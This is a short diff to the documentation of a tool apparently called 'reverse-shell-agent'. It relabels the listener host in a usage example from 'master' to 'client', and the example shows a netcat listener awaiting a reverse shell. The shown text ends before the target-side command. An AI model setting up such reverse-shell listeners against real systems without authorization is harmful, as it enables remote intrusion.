@@ -13,7 +13,7 @@ reverse-shell-agent tcp [flags]
 ### Examples
 
 ```
-# On the master (1.2.3.4)
+# On the client (1.2.3.4)
 $ nc -v -l -p 7777
 
 # On the target
